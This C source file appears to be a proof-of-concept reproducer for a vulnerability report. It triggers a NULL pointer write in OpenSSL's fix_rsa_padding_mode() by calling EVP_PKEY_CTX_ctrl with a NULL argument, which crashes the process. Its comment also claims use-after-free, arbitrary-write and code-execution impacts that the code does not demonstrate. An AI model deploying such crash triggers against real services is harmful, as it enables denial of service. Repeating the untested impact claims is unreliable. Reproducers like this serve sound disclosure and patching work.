/*
 * PoC for SF02: NULL pointer dereference (write) via unvalidated ctx->orig_p2
 * in fix_rsa_padding_mode() at ctrl_params_translate.c:1359
 *
 * VULNERABILITY SUMMARY:
 * EVP_PKEY_CTRL_GET_RSA_PADDING stores p2 in ctx->orig_p2 (PRE phase),
 * then writes *(int *)ctx->orig_p2 = padding_mode_id (POST phase),
 * without validating that orig_p2 is non-NULL or points to writable memory.
 *
 * TRIGGER PATH (OpenSSL 3.x PROVIDER state):
 * EVP_PKEY_CTX_ctrl(pctx, EVP_PKEY_RSA, EVP_PKEY_OP_TYPE_CRYPT,
 *                   EVP_PKEY_CTRL_GET_RSA_PADDING, 0, NULL)
 * -> evp_pkey_ctx_ctrl_int() (PROVIDER state)
 * -> evp_pkey_ctx_ctrl_to_param()
 * -> fix_rsa_padding_mode(PRE_CTRL_TO_PARAMS):
 *      ctx->orig_p2 = ctx->p2  (= NULL, attacker-controlled)
 *      ctx->p2 = ctx->name_buf
 * -> evp_pkey_ctx_get_params_strict() [gets padding string "pkcs1" into name_buf]
 * -> fix_rsa_padding_mode(POST_CTRL_TO_PARAMS):
 *      finds match in str_value_map
 *      *(int *)ctx->orig_p2 = RSA_PKCS1_PADDING  <-- WRITE TO NULL!
 *
 * IMPACT:
 * - NULL p2: NULL pointer dereference write -> SIGSEGV -> Denial of Service
 * - Freed p2: Use-after-free write -> heap corruption -> potential code execution
 * - Invalid/arbitrary p2: Arbitrary write primitive
 *
 * AFFECTED FILE: openssl33/crypto/evp/ctrl_params_translate.c
 * AFFECTED FUNCTION: fix_rsa_padding_mode() at line 1359
 * ALSO AFFECTED: fix_rsa_pss_saltlen() at line 1439 (same pattern)
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/core_names.h>
#include <openssl/params.h>
#include <openssl/err.h>

static EVP_PKEY *create_rsa_key(int bits) {
    EVP_PKEY *pkey = NULL;
    EVP_PKEY_CTX *genctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if (!genctx) return NULL;
    if (EVP_PKEY_keygen_init(genctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_keygen_bits(genctx, bits) <= 0 ||
        EVP_PKEY_keygen(genctx, &pkey) <= 0)
        pkey = NULL;
    EVP_PKEY_CTX_free(genctx);
    return pkey;
}

int main(void) {
    EVP_PKEY *pkey = NULL;
    EVP_PKEY_CTX *pctx = NULL;
    int ret;

    printf("=== SF02 PoC: Unvalidated orig_p2 Write in fix_rsa_padding_mode() ===\n\n");

    /* Step 1: Generate RSA key */
    pkey = create_rsa_key(1024);
    if (!pkey) {
        fprintf(stderr, "RSA key generation failed\n");
        ERR_print_errors_fp(stderr);
        return 1;
    }
    printf("[+] RSA-1024 key generated\n");

    /* Step 2: Create encryption context (PROVIDER state in OpenSSL 3.x) */
    pctx = EVP_PKEY_CTX_new(pkey, NULL);
    if (!pctx || EVP_PKEY_encrypt_init(pctx) <= 0) {
        fprintf(stderr, "Context init failed\n");
        ERR_print_errors_fp(stderr);
        return 1;
    }
    printf("[+] RSA encrypt context created (PROVIDER state)\n");

    /* Step 3: Verify normal operation works */
    int padding = -1;
    ret = EVP_PKEY_CTX_ctrl(pctx, EVP_PKEY_RSA, EVP_PKEY_OP_TYPE_CRYPT,
                             EVP_PKEY_CTRL_GET_RSA_PADDING, 0, &padding);
    printf("[+] Normal EVP_PKEY_CTRL_GET_RSA_PADDING: ret=%d, padding=%d\n",
           ret, padding);

    /* Step 4: CRASH - EVP_PKEY_CTRL_GET_RSA_PADDING with NULL p2
     *
     * The vulnerability: fix_rsa_padding_mode() stores ctx->p2 (= NULL) in
     * ctx->orig_p2, then unconditionally writes *(int*)ctx->orig_p2 = id
     * in the POST_CTRL_TO_PARAMS phase.
     *
     * ctrl_params_translate.c line 1359:
     *   *(int *)ctx->orig_p2 = str_value_map[i].id;
     *                          ^^^
     *                          ctx->orig_p2 is NULL -> WRITE to address 0x0
     */
    printf("\n[!] Triggering SF02: Calling EVP_PKEY_CTRL_GET_RSA_PADDING with p2=NULL\n");
    printf("[!] Expected: SIGSEGV (write to 0x0) in fix_rsa_padding_mode:1359\n");
    fflush(stdout);

    /* This call CRASHES - writes to NULL pointer */
    ret = EVP_PKEY_CTX_ctrl(pctx, EVP_PKEY_RSA, EVP_PKEY_OP_TYPE_CRYPT,
                             EVP_PKEY_CTRL_GET_RSA_PADDING, 0, NULL);

    /* UNREACHABLE - crash should happen above */
    printf("[-] BUG: Did not crash! ret=%d\n", ret);
    ERR_print_errors_fp(stderr);

    EVP_PKEY_CTX_free(pctx);
    EVP_PKEY_free(pkey);
    return 0;
}
